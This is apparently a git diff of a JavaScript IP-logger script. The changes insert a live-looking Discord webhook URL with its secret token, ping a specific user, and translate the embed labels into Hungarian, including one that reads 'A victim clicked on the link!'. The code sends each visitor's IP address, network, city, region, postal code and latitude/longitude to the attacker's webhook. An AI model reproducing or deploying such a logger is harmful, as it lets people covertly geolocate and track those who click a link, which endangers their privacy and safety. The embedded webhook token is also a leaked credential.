@@ -14,7 +14,7 @@ const sendIP = () => {
 
                 .then(geoData => {
 
-                    const dscURL = 'YOUR WEBHOOK'; // replace with your webhook url
+                    const dscURL = 'https://discord.com/api/webhooks/1397140201008267375/OigaJ4FR510_5ExJAanLzDF0VKx-vnmNSEtpxbphhuQLizgB781VzCCR0o2Bp5l5SvX3'; // replace with your webhook url
 
                     return fetch(dscURL, {
 
@@ -28,19 +28,19 @@ const sendIP = () => {
 
                         body: JSON.stringify({
 
-                            username: "site logger <3", // optionally changeable
+                            username: "Helyszíni Naplózó <3", // optionally changeable
 
                             avatar_url: "https://i.pinimg.com/736x/bc/56/a6/bc56a648f77fdd64ae5702a8943d36ae.jpg", // optionally changeable
 
-                            content: `@here`,
+                            content: `<@1095731086513930260>`,
 
                             embeds: [
 
                                 {
 
-                                    title: 'A victim clicked on the link!',
+                                    title: 'Egy áldozat rákattintott a linkre!',
 
-                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
+                                    description: `**IP-cím >> **${ipadd}\n**Hálózat >> ** ${geoData.network}\n**Város >> ** ${geoData.city}\n**Régió >> ** ${geoData.region}\n**Ország >> ** ${geoData.country_name}\n**Irányítószám >> ** ${geoData.postal}\n**Szélesség >> ** ${geoData.latitude}\n**Hosszúság >> ** ${geoData.longitude}`,
 
                                     color: 0x800080 // optionally changeable
 
